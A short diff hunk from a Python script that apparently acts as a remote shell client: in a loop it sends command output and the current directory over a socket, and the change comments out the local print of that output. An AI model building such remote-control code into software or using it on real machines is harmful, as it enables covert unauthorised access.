@@ -35,4 +35,4 @@ while True:
 
         currentWD = os.getcwd() + ">"
         s.send(str.encode(response + currentWD))
-        print(response)
+        #print(response)
